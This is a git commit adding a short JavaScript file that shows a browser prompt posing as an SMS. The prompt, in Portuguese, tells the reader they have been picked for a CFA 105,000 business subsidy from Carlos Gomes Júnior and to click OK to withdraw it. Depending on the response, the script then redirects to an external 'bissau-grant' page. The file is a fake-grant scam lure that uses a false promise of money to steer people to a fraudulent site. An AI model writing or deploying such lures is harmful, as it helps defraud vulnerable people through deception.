1d0c50969a3778ec4afc13982debce3108512891
sureconnect001 <ukpe247@gmail.com>
2025-05-31 08:48:38 +0100

    Create active-guinea.js

---
+++ active-guinea.js
@@ -0,0 +1,5 @@
+var password = 'SAQUE CFA105.000'
+password=prompt('SMS: Parabéns, você está entre os selecionados para receber o Subsídio de Apoio Empresarial CFA105.000 de Carlos Gomes Júnior, Clique em Ok para sacar dinheiro agora ','SAQUE CFA105.000');
+if (password != 'SAQUE CFA105.000') {
+location.href='https://sure-connect.org/bissau-grant.html';
+}
